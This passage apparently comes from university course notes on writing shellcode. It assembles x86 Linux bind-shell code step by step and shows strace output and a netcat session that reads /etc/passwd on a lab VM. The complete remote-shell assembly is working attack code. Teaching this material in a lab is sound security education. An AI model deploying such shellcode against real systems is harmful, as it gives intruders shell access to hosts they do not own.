+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">eax</span>                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">0,0</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">WORD</span> 0x697a        <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">htonos(31337)</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">WORD</span> 0x02          <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">2</span>
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">ecx</span>,esp
+
+
+
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">0x16</span>               <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">sizeof(host_addr)</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">ecx</span>                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">host_addr</span>
+<span style="color: #87cefa;">push</span> <span style="color: #00ffff;">esi</span>                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">assume esi stores socketfd</span>
+
+<span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">ebx</span>,ebx
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">bl</span>,0x2              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_BIND</span>
+
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">ecx</span>,esp             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args</span>
+
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">al</span>,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL</span>
+<span style="color: #87cefa;">int</span> <span style="color: #00ffff;">0x80</span>
+</pre>
+</div>
+<p>
+And if we run it under strace, we see that it does call bind:
+</p>
+<pre class="example">user@si485H-base:demo$ strace ./bind_socket 
+execve("./bind_socket", ["./bind_socket"], [/* 20 vars */]) = 0
+bind(0, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 22) = -1 ENOTSOCK (Socket operation on non-socket)
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffa8} ---
++++ killed by SIGSEGV (core dumped) +++
+Segmentation fault (core dumped)
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-3-3" class="outline-3">
+<h3 id="sec-3-3"><span class="section-number-3">3.3</span> <code>listen()</code> in assembly</h3>
+<div class="outline-text-3" id="text-3-3">
+<p>
+The next socketcall() is perhaps the easiest: <code>listen()</code>.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c"><span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">set up listening queue</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">listen_args</span>[] = {server, 4};
+  socketcall(SYS_LISTEN, (<span style="color: #98fb98;">long</span> *) listen_args);
+</pre>
+</div>
+
+<p>
+There is only one argument to deal with, and we can quickly do the
+conversion like so.
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">tart</span>:
+        <span style="color: #00ffff;">xor</span> ecx,ecx
+        <span style="color: #00ffff;">mov</span> cl,0x5
+
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">5</span>
+        <span style="color: #00ffff;">push</span> esi                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socketfd</span>
+
+        <span style="color: #00ffff;">mov</span> ecx, esp            <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args = {5,socketfd}</span>
+
+        <span style="color: #00ffff;">xor</span> ebx,ebx
+        <span style="color: #00ffff;">mov</span> bl, 0x4             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_LISTEN</span>
+
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">mov</span> al,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL</span>
+        <span style="color: #00ffff;">int</span> 0x80
+</pre>
+</div>
+<pre class="example">user@si485H-base:demo$ strace ./listen_socket 
+execve("./listen_socket", ["./listen_socket"], [/* 20 vars */]) = 0
+listen(0, 5)                            = -1 ENOTSOCK (Socket operation on non-socket)
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffa8} ---
++++ killed by SIGSEGV (core dumped) +++
+Segmentation fault (core dumped)
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-3-4" class="outline-3">
+<h3 id="sec-3-4"><span class="section-number-3">3.4</span> <code>accept()</code>  in assembly</h3>
+<div class="outline-text-3" id="text-3-4">
+<p>
+Turns out, that accept is also pretty easy. In C, we have this:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-c">sin_size = <span style="color: #00ffff;">sizeof</span>(<span style="color: #00ffff;">struct</span> <span style="color: #98fb98;">sockaddr_in</span>);
+
+  <span style="color: #ff7f24;">//</span><span style="color: #ff7f24;">accept incoming connection</span>
+  <span style="color: #98fb98;">int</span> <span style="color: #eedd82;">accept_args</span>[] = {server, (<span style="color: #98fb98;">int</span>) &amp;client_addr, (<span style="color: #98fb98;">int</span>) &amp;sin_size};
+  client = socketcall(SYS_ACCEPT, (<span style="color: #98fb98;">long</span> *) accept_args);
+</pre>
+</div>
+
+<p>
+But, we don't really care about the client's address, so we can set
+that to NULL (or 0), which means that the next argument, the size, is
+also 0. That means our socket argument is: <code>{ socketfd, 0, 0}</code>. In
+assembly, we get the following:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">section</span> .text
+        <span style="color: #00ffff;">global</span> _start
+
+<span style="color: #87cefa;">_start</span>:
+        <span style="color: #00ffff;">xor</span> ecx,ecx
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">0</span>
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">0</span>
+        <span style="color: #00ffff;">push</span> esi                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">socketfd</span>
+        <span style="color: #00ffff;">mov</span> ecx,esp             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args = {socketfd,0,0}</span>
+
+        <span style="color: #00ffff;">xor</span> ebx,ebx
+        <span style="color: #00ffff;">mov</span> bl, 0x5             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_LISTEN</span>
+
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">mov</span> al,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL</span>
+        <span style="color: #00ffff;">int</span> 0x80
+</pre>
+</div>
+<pre class="example">execve("./accept_socket", ["./accept_socket"], [/* 20 vars */]) = 0
+accept(0, 0, NULL)                      = -1 ENOTSOCK (Socket operation on non-socket)
+--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0xffffffa8} ---
++++ killed by SIGSEGV (core dumped) +++
+Segmentation fault (core dumped)
+</pre>
+</div>
+</div>
+<div id="outline-container-sec-3-5" class="outline-3">
+<h3 id="sec-3-5"><span class="section-number-3">3.5</span> <code>dup2()</code> in assembly</h3>
+<div class="outline-text-3" id="text-3-5">
+<p>
+Finally, to move away fro the domain of networking, we have to the
+dup2() system calls. This is much like the standard system calls we've
+been doing so far. The system call number for dup2() is 0x3f. That
+leaves us with the following code assembly for dup2() if we assume
+<code>esi</code> stores our sockfd:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">ebx</span>,esi             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">sockfd</span>
+<span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">ecx</span>,ecx             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">stdin 0</span>
+
+
+<span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">eax</span>,eax
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">al</span>, 0x3f
+<span style="color: #87cefa;">int</span> <span style="color: #00ffff;">0x80</span>
+
+<span style="color: #87cefa;">inc</span> <span style="color: #00ffff;">ecx</span>                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">stdout 1</span>
+<span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">eax</span>,eax
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">al</span>, 0x3f
+<span style="color: #87cefa;">int</span> <span style="color: #00ffff;">0x80</span>
+
+<span style="color: #87cefa;">inc</span> <span style="color: #00ffff;">ecx</span>                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">stderr 2</span>
+<span style="color: #87cefa;">xor</span> <span style="color: #00ffff;">eax</span>,eax
+<span style="color: #87cefa;">mov</span> <span style="color: #00ffff;">al</span>, 0x3f
+<span style="color: #87cefa;">int</span> <span style="color: #00ffff;">0x80</span>
+</pre>
+</div>
+</div>
+</div>
+</div>
+
+<div id="outline-container-sec-4" class="outline-2">
+<h2 id="sec-4"><span class="section-number-2">4</span> Putting it all together</h2>
+<div class="outline-text-2" id="text-4">
+<p>
+Now that we have all the parts, we can look at the entire assembly
+that actually goes ahead and executes a remote shell:
+</p>
+
+<div class="org-src-container">
+
+<pre class="src src-asm"><span style="color: #87cefa;">section</span> .text
+        <span style="color: #00ffff;">global</span> _start
+
+<span style="color: #87cefa;">_start</span>:
+
+        <span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">socket()</span>
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">push</span> eax
+        <span style="color: #00ffff;">push</span> 0x1
+        <span style="color: #00ffff;">push</span> 0x2
+        <span style="color: #00ffff;">mov</span> ecx,esp             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args</span>
+
+        <span style="color: #00ffff;">xor</span> ebx,ebx
+        <span style="color: #00ffff;">inc</span> ebx                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKET</span>
+
+        <span style="color: #00ffff;">mov</span> al,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL</span>
+
+        <span style="color: #00ffff;">int</span> 0x80
+
+        <span style="color: #00ffff;">mov</span> esi,eax             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">save sockfd in esi</span>
+
+        <span style="color: #ff7f24;">;;</span><span style="color: #ff7f24;">bind()</span>
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">push</span> eax                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">0,0</span>
+        <span style="color: #00ffff;">push</span> WORD 0x697a        <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">htonos(31337)</span>
+        <span style="color: #00ffff;">push</span> WORD 0x02          <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">2</span>
+        <span style="color: #00ffff;">mov</span> ecx,esp
+
+        <span style="color: #00ffff;">push</span> 0x16               <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">sizeof(host_addr)</span>
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">host_addr</span>
+        <span style="color: #00ffff;">push</span> esi                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">assume esi stores socketfd</span>
+
+        <span style="color: #00ffff;">xor</span> ebx,ebx
+        <span style="color: #00ffff;">mov</span> bl,0x2              <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_BIND</span>
+
+        <span style="color: #00ffff;">mov</span> ecx,esp             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args</span>
+
+        <span style="color: #00ffff;">mov</span> al,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL</span>
+        <span style="color: #00ffff;">int</span> 0x80
+
+        <span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">listen()</span>
+        <span style="color: #00ffff;">xor</span> ecx,ecx
+        <span style="color: #00ffff;">mov</span> cl,0x5
+
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">5</span>
+        <span style="color: #00ffff;">push</span> esi                <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socketfd</span>
+
+        <span style="color: #00ffff;">mov</span> ecx, esp            <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args = {5,socketfd}</span>
+
+        <span style="color: #00ffff;">xor</span> ebx,ebx
+        <span style="color: #00ffff;">mov</span> bl, 0x4             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_LISTEN</span>
+
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">mov</span> al,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL</span>
+        <span style="color: #00ffff;">int</span> 0x80
+
+        <span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">accept()</span>
+        <span style="color: #00ffff;">xor</span> ecx,ecx
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">0</span>
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">0</span>
+        <span style="color: #00ffff;">push</span> esi                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">socketfd</span>
+        <span style="color: #00ffff;">mov</span> ecx,esp             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">socket_args = {socketfd,0,0}</span>
+
+        <span style="color: #00ffff;">xor</span> ebx,ebx
+        <span style="color: #00ffff;">mov</span> bl, 0x5             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_LISTEN</span>
+
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">mov</span> al,0x66             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">SYS_SOCKETCALL</span>
+        <span style="color: #00ffff;">int</span> 0x80
+
+        <span style="color: #00ffff;">mov</span> esi,eax             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">new accepted socket stored in esi</span>
+
+        <span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">dup2()</span>
+        <span style="color: #00ffff;">mov</span> ebx,esi             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">sockfd</span>
+        <span style="color: #00ffff;">xor</span> ecx,ecx             <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">stdin 0</span>
+
+
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">mov</span> al, 0x3f
+        <span style="color: #00ffff;">int</span> 0x80
+
+        <span style="color: #00ffff;">inc</span> ecx                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">stdout 1</span>
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">mov</span> al, 0x3f
+        <span style="color: #00ffff;">int</span> 0x80
+
+        <span style="color: #00ffff;">inc</span> ecx                 <span style="color: #ff7f24;">;</span><span style="color: #ff7f24;">stderr 2</span>
+        <span style="color: #00ffff;">xor</span> eax,eax
+        <span style="color: #00ffff;">mov</span> al, 0x3f
+        <span style="color: #00ffff;">int</span> 0x80
+
+        <span style="color: #ff7f24;">;; </span><span style="color: #ff7f24;">execve()</span>
+        <span style="color: #00ffff;">xor</span> ecx,ecx
+        <span style="color: #00ffff;">mul</span> ecx
+        <span style="color: #00ffff;">push</span> ecx                <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">null terminator</span>
+        <span style="color: #00ffff;">push</span> 0x68732f2f         <span style="color: #ff7f24;">; </span><span style="color: #ff7f24;">/bin/sh</span>
+        <span style="color: #00ffff;">push</span> 0x6e69622f
+        <span style="color: #00ffff;">mov</span> ebx,esp
+        <span style="color: #00ffff;">mov</span> al, 0xb     
+        <span style="color: #00ffff;">int</span> 0x80
+</pre>
+</div>
+
+
+<pre class="example">user@si485H-base:demo$ strace ./assembly_rsh
+execve("./assembly_rsh", ["./assembly_rsh"], [/* 20 vars */]) = 0
+socket(PF_INET, SOCK_STREAM, IPPROTO_IP) = 3
+bind(3, {sa_family=AF_INET, sin_port=htons(31337), sin_addr=inet_addr("0.0.0.0")}, 22) = 0
+listen(3, 5)                            = 0
+accept(3, ...
+</pre>
+
+<p>
+Then I can connect remotely:
+</p>
+
+<pre class="example">[aviv@potbelly] 15 &gt;netcat 192.168.56.101 31337
+</pre>
+
+<p>
+Which will cause the accept() to complete:
+</p>
+
+<pre class="example">(...)
+accept(3, 0, NULL)                      = 4
+dup2(4, 0)                              = 0
+dup2(4, 1)                              = 1
+dup2(4, 2)                              = 2
+execve("/bin//sh", [0], [/* 0 vars */]) = 0
+</pre>
+
+<p>
+And on the remote server, I can now do as I please:
+</p>
+
+<pre class="example">[aviv@potbelly] 15 &gt;netcat 192.168.56.101 31337
+cat /etc/passwd 
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+libuuid:x:100:101::/var/lib/libuuid:
+syslog:x:101:104::/home/syslog:/bin/false
+messagebus:x:102:106::/var/run/dbus:/bin/false
+usbmux:x:103:46:usbmux daemon,,,:/home/usbmux:/bin/false
+dnsmasq:x:104:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+avahi-autoipd:x:105:113:Avahi autoip daemon,,,:/var/lib/avahi-autoipd:/bin/false
+kernoops:x:106:65534:Kernel Oops Tracking Daemon,,,:/:/bin/false
+rtkit:x:107:114:RealtimeKit,,,:/proc:/bin/false
+saned:x:108:115::/home/saned:/bin/false
+whoopsie:x:109:116::/nonexistent:/bin/false
+speech-dispatcher:x:110:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
+avahi:x:111:117:Avahi mDNS daemon,,,:/var/run/avahi-daemon:/bin/false
+lightdm:x:112:118:Light Display Manager:/var/lib/lightdm:/bin/false
+colord:x:113:121:colord colour management daemon,,,:/var/lib/colord:/bin/false
+hplip:x:114:7:HPLIP system user,,,:/var/run/hplip:/bin/false
+pulse:x:115:122:PulseAudio daemon,,,:/var/run/pulse:/bin/false
+user:x:1000:1000:user,,,:/home/user:/bin/bash
+vboxadd:x:999:1::/var/run/vboxadd:/bin/false
+sshd:x:116:65534::/var/run/sshd:/usr/sbin/nologin
+aviv:x:1001:1001:Adam Aviv,,,:/home/aviv:/bin/bash
+</pre>
+</div>
+
+<div id="outline-container-sec-4-1" class="outline-3">
+<h3 id="sec-4-1"><span class="section-number-3">4.1</span> This is some large shell code</h3>
+<div class="outline-text-3" id="text-4-1">
+<p>
+This shell code is significantly bigger than anything we've seen so
+far. That's because it takes a lot of effort of effort to open a
+remote shell. Right now, we are at 126 bytes.
+</p>
+
+<pre class="example">user@si485H-base:demo$ printf `./hexify.sh assembly_rsh` | wc -c
+126
+</pre>
+
+<p>
+That's just too big. Let's see where we can reduce in size … or
+maybe that is something you should do in a lab :)
+</p>
+</div>
+</div>
+</div>
+</div>
+
+</body></html>
